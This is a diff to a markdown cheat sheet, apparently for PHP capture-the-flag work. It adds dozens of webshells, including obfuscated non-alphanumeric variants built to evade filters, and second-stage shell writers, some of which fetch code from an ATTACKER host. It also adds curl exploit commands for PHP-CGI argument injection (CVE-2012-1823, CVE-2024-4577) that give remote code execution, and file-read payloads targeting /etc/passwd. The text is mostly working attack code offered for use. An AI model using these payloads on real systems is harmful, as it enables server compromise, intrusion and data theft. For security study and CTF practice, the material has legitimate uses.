@@ -32,37 +32,255 @@ rg -n "include|require|eval|assert|system|exec|shell_exec|passthru|popen|proc_op
 
 ## Webshell
 
-```php
-Short webshell
-<?=`$_GET[0]`?> 
-${_GET}{0}('DD');
-${~'%A0%B8%BA%AB'}{0}('DD');
-${~\xa0\xb8\xba\xab}{0}(${~\xa0\xb8\xba\xab}{1}) // then use 0=assert
-
-
-Without Alphanumeric
-<?php $_="{"; $_=($_^"<").($_^">;").($_^"/"); ?> <?=${'_'.$_}["_"](${'_'.$_}["__"]);?>
-
-Without spaces webshell 
-<?=$_=${'_'.('{{{'^'<>/')};$_[0]($_[1]);?> 
-<?=$_=${'_'.('{{{'^'<>/')};$_[0]($_[1]($_[2]));?>
-
-Without space and alphanumeric
-<?=$_=${'_'.('{{{'^'<>/')};$_['__']($_['___']);?>
-<?=$_=${'_'.('{{{'^'<>/')};$_['__']($_['___']($_['____']));?>
-
-```
-
-More shells:
+Small command shells:
 
 ```php
+<?=`$_GET[0]`?>
+<?=`$_REQUEST[0]`?>
+<?=$_GET[0]($_GET[1]);?>
+<?=system($_GET[0]);?>
+<?=passthru($_GET[0]);?>
+<?=shell_exec($_GET[0]);?>
 <?php system($_GET[0]); ?>
 <?php passthru($_REQUEST[0]); ?>
 <?php echo shell_exec($_POST[0]); ?>
 <?php $f='sys'.'tem'; $f($_GET[0]); ?>
 <?php array_map('system', $_GET); ?>
 <?php assert($_GET[0]); ?>
+<?php eval($_POST[0]); ?>
 ```
+
+Legacy short shells:
+
+```php
+<?=`$_GET[0]`?>
+${_GET}{0}('id');
+${~'%A0%B8%BA%AB'}{0}('id');
+${~\xa0\xb8\xba\xab}{0}(${~\xa0\xb8\xba\xab}{1}); // use 0=assert&1=system('id');
+```
+
+Call:
+
+```text
+/shell.php?0=id
+/shell.php?0=cat%20/flag*
+/shell.php?0=system&1=id
+curl -X POST http://HOST/shell.php -d '0=id'
+```
+
+Read-only flag shells when command execution is blocked:
+
+```php
+<?=file_get_contents("/flag")?>
+<?=readfile("/flag")?>
+<?=highlight_file(__FILE__)?>
+<?=print_r(scandir("/"))?>
+<?=var_dump(glob("/*"))?>
+<?=implode("\n",glob("/*"))?>
+```
+
+Write a second-stage shell:
+
+```php
+<?=file_put_contents("/tmp/s.php","<?=`$_GET[0]`?>")?>
+<?=copy("http://ATTACKER/s.txt","/tmp/s.php")?>
+<?=fwrite(fopen("/tmp/s.php","w"),"<?=$_GET[0]($_GET[1]);?>")?>
+```
+
+Callback helpers:
+
+```php
+<?=call_user_func($_GET[0],$_GET[1]);?>
+<?=call_user_func_array($_GET[0],$_GET[1]);?>
+<?=array_map($_GET[0],[$_GET[1]]);?>
+<?=filter_var($_GET[1],FILTER_CALLBACK,["options"=>$_GET[0]]);?>
+```
+
+```text
+?0=system&1=id
+?0=file_get_contents&1=/flag
+?0=printf&1[]=CBC{%s}&1[]=test
+```
+
+Function + argument over request parameters:
+
+```php
+<?=$_=$_GET;$_[0]($_[1]);?>
+<?=$_=$_POST;$_[0]($_[1]);?>
+<?=$_=$_REQUEST;$_[0]($_[1]);?>
+```
+
+```text
+?0=system&1=id
+?0=print_r&1=scandir&2=/
+```
+
+Nested call for functions that do not print:
+
+```php
+<?=$_=$_GET;$_[0]($_[1]($_[2]));?>
+<?=$_=$_POST;$_[0]($_[1]($_[2]));?>
+```
+
+```text
+?0=print_r&1=file_get_contents&2=/flag.txt
+?0=var_dump&1=scandir&2=/
+```
+
+Keep these older constrained payloads around; they are still useful in filters:
+
+Without alphanumeric:
+
+```php
+<?php $_="{"; $_=($_^"<").($_^">;").($_^"/"); ?> <?=${'_'.$_}["_"](${'_'.$_}["__"]);?>
+```
+
+Without spaces webshell:
+
+```php
+<?=$_=${'_'.('{{{'^'<>/')};$_[0]($_[1]);?>
+<?=$_=${'_'.('{{{'^'<>/')};$_[0]($_[1]($_[2]));?>
+```
+
+Without space and alphanumeric:
+
+```php
+<?=$_=${'_'.('{{{'^'<>/')};$_['__']($_['___']);?>
+<?=$_=${'_'.('{{{'^'<>/')};$_['__']($_['___']($_['____']));?>
+```
+
+Multiple arguments through `call_user_func_array`:
+
+```php
+<?=$_=$_GET;$_[0]($_[1],$_[2]);?>
+<?=$_=$_GET;$_[0]($_[1],$_[2],$_[3]);?>
+```
+
+```text
+?0=file_put_contents&1=/tmp/x.php&2=<?=`$_GET[0]`?>
+?0=call_user_func_array&1=file_put_contents&2[]=/tmp/x.txt&2[]=hello
+```
+
+No parentheses:
+
+```php
+<?=include"/flag"?>
+<?=require"/flag"?>
+<?=print`$_GET[0]`?>
+```
+
+No quotes:
+
+```php
+<?=`$_GET[0]`?>
+<?=$_GET[0]($_GET[1])?>
+<?=include$_GET[0]?>
+```
+
+No semicolon:
+
+```php
+<?=system($_GET[0])?>
+<?=`$_GET[0]`?>
+```
+
+No `<?php` long tag:
+
+```php
+<?=`$_GET[0]`?>
+<script language=php>system($_GET[0]);</script>
+```
+
+No `system` string:
+
+```php
+<?=$_=("sys"."tem");$_($_GET[0]);?>
+<?=$_=str_rot13("flfgrz");$_($_GET[0]);?>
+<?=$_=base64_decode("c3lzdGVt");$_($_GET[0]);?>
+```
+
+No spaces:
+
+```php
+<?=$_=${'_'.('{{{'^'<>/')};$_[0]($_[1]);?>
+<?=$_=${'_'.('{{{'^'<>/')};$_[0]($_[1]($_[2]));?>
+```
+
+```text
+?0=system&1=id
+?0=print_r&1=file_get_contents&2=/flag.txt
+```
+
+No alphanumeric in shell body:
+
+```php
+<?php $_="{"; $_=($_^"<").($_^">;").($_^"/"); ?><?=${'_'.$_}["_"](${'_'.$_}["__"]);?>
+<?=$_=${'_'.('{{{'^'<>/')};$_['__']($_['___']);?>
+<?=$_=${'_'.('{{{'^'<>/')};$_['__']($_['___']($_['____']));?>
+```
+
+```text
+?_GET[_]=system&_GET[__]=id
+?__=system&___=id
+?__=print_r&___=file_get_contents&____=/flag.txt
+```
+
+Non-alphanumeric and no quotes, using request parameter `0=function&1=arg`:
+
+```php
+<?=$_=[]..1;$_=${$_[6].$_[3].$_[4].$_[3].$_[3]^($_^$_[5]).+1625};$_[0]($_[1]);
+```
+
+```bash
+curl 'http://HOST/shell.php' -d '0=system&1=id'
+curl 'http://HOST/shell.php' -d '0=system&1=cat /flag*'
+```
+
+GET variant:
+
+```php
+<?=$_=[]..1;$_=$_[1].$_[1].$_[1].$_[3]^-575..-1;$$_[0]($$_[1]);
+```
+
+```bash
+curl 'http://HOST/shell.php?0=system&1=id'
+```
+
+POST variant:
+
+```php
+<?=$_=[]..1;$_=$_[1].$_[3].$_[3].$_[3].$_[4]^-1.2.-1;$$_[0]($$_[1]);
+```
+
+```bash
+curl 'http://HOST/shell.php' -X POST -d '0=system&1=id'
+```
+
+No quotes via `INF` string:
+
+```php
+<?=$_=9**999...1;$_=801..-1^($_[4].+92..$_[0])^$_;$$_[0]($$_[1]);
+<?=$_=-9**999...1;$_=4408..-1^$_^$_[3].$_[0].$_[6].$_[0].$_[1];$$_[0]($$_[1]);
+```
+
+PHP 7 underscore-constant variants:
+
+```php
+<?=$_=[]._;$_=_.($_[2].$_[2].$_[3]^575.._);$$_[0]($$_[1]);
+<?=$_=[]._;$_=_.($_[3].$_[4].$_[3].$_[3]^1625.._);$$_[0]($$_[1]);
+```
+
+Extended no-alnum shell for non-printing file reads:
+
+```php
+<?=$_=[]._;$_=${_.($_[2].$_[2].$_[3]^575.._)};$_[0]($_[1]($_[2],$_[3]));
+```
+
+```text
+0=print_r&1=call_user_func_array&2=file_put_contents&3[]=/tmp/x.txt&3[]=hello
+```
+
+If warnings break output, try prefixing the type-cast expression with `@` in array/string based shells.
 
 ## Wrappers
 
@@ -226,6 +444,110 @@ If LFI can include PHP files and query args are parsed like CLI argv:
 /?+config-create+/<?=system($_GET[0]);?>+/tmp/s.php&file=/usr/local/lib/php/pearcmd.php
 /?file=/tmp/s.php&0=id
 /?+install+--force+--installroot+/tmp/pwn+http://ATTACKER/pkg.tgz&file=/usr/local/lib/php/peclcmd.php
+```
+
+## PHP-CGI Argument Injection
+
+Bug class: user-controlled query string becomes command-line arguments to `php-cgi`. This is the Metasploit-style category you usually see as PHP CGI argument injection.
+
+Relevant CVEs:
+
+```text
+CVE-2012-1823: classic PHP-CGI query-string argument injection.
+CVE-2024-4577: Windows PHP-CGI best-fit character bypass, similar impact.
+```
+
+Quick checks:
+
+```bash
+curl -i 'http://TARGET/index.php?-s'
+curl -i 'http://TARGET/index.php?%2ds'
+curl -i 'http://TARGET/index.php?%ADs'
+```
+
+If vulnerable, source disclosure often works with `-s`. RCE shape is to enable URL includes and prepend PHP from request body:
+
+```bash
+curl 'http://TARGET/index.php?-d+allow_url_include=1+-d+auto_prepend_file=php://input&0=id' \
+  --data '<?php system($_GET[0]); ?>'
+```
+
+Encoded hyphen variant:
+
+```bash
+curl 'http://TARGET/index.php?%2dd+allow_url_include=1+%2dd+auto_prepend_file=php://input&0=id' \
+  --data '<?php system($_GET[0]); ?>'
+```
+
+CVE-2024-4577 Windows best-fit uses soft hyphen as `-` on affected locales:
+
+```bash
+curl 'http://TARGET/index.php?%ADd+allow_url_include=1+%ADd+auto_prepend_file=php://input&0=id' \
+  --data '<?php system($_GET[0]); ?>'
+```
+
+Other useful flags:
+
+```text
+-s                              source highlight / disclosure
+-n                              no php.ini
+-d key=value                    override ini value
+-d disable_functions=           try clearing disabled_functions if allowed
+-d open_basedir=                try clearing open_basedir if allowed
+-d auto_prepend_file=php://input
+-d auto_append_file=php://input
+```
+
+Notes:
+
+```text
+Works against CGI/FastCGI-style exposure, not normal mod_php.
+CVE-2024-4577 is Windows/locale/codepage specific.
+If `?` arguments are normalized by a proxy, try encoded hyphen and plus/space variants.
+```
+
+## PHP Filter / iconv CNEXT
+
+Bug class: PHP file-read/LFI primitive plus `php://filter` can become RCE through filter-chain heap manipulation. The famous modern case is CVE-2024-2961, a glibc `iconv()` out-of-bounds write when converting to `ISO-2022-CN-EXT`.
+
+Use when:
+
+```text
+You can read arbitrary files through php://filter.
+Target is Linux/glibc, not Windows.
+glibc is vulnerable or unpatched.
+The app runs PHP and exposes a stable file read endpoint.
+```
+
+Triage payloads:
+
+```text
+/?file=php://filter/convert.base64-encode/resource=/etc/passwd
+/?file=php://filter/convert.iconv.UTF-8.ISO-2022-CN-EXT/resource=/etc/passwd
+/?file=php://filter/convert.iconv.UTF8.CSISO2022KR/resource=/etc/passwd
+```
+
+If the read endpoint supports filters and the target looks vulnerable, use a maintained exploit generator instead of hand-writing the chain:
+
+```bash
+git clone --recurse-submodules https://github.com/ambionics/cnext-exploits.git
+```
+
+Related filter-chain tools/ideas:
+
+```text
+php_filter_chain_generator: build PHP code through filters for include sinks.
+wrapwrap: force prefix/suffix around filter output to satisfy parsers.
+CNEXT / CVE-2024-2961: turn certain PHP file-read primitives into RCE.
+```
+
+Important distinction:
+
+```text
+filter-chain generator needs an include/eval-like sink.
+CNEXT targets some read-only file disclosure primitives and may upgrade them to RCE.
+pearcmd/peclcmd needs includable PEAR PHP files and argv-style query parsing.
+PHP-CGI arg injection does not need LFI; it targets CGI argument parsing.
 ```
 
 ## Disabled Function Bypasses
